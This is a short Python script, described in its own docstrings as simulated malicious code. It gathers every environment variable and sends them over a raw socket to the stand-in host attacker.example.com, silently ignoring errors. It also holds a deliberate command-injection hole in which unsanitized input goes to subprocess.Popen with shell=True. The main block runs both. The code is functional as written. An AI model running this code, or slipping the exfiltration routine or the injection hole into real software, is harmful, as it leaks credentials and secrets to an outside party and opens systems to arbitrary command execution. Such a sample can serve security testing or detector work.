import socket
import os
import subprocess

def exfiltrate_data():
    """
    Simulated malicious code that exfiltrates environment variables to a remote server.
    """
    remote_host = "attacker.example.com"
    remote_port = 8080
    
    # 1. Gather sensitive data
    data = str(os.environ)
    
    # 2. Open a socket and send it
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((remote_host, remote_port))
            s.sendall(data.encode())
    except Exception as e:
        # Silently fail
        pass

def shell_backdoor(user_command):
    """
    Simulated RCE vulnerability via unsanitized subprocess.
    """
    # 3. Remote Command Execution
    subprocess.Popen(user_command, shell=True)

if __name__ == "__main__":
    exfiltrate_data()
    shell_backdoor("whoami")
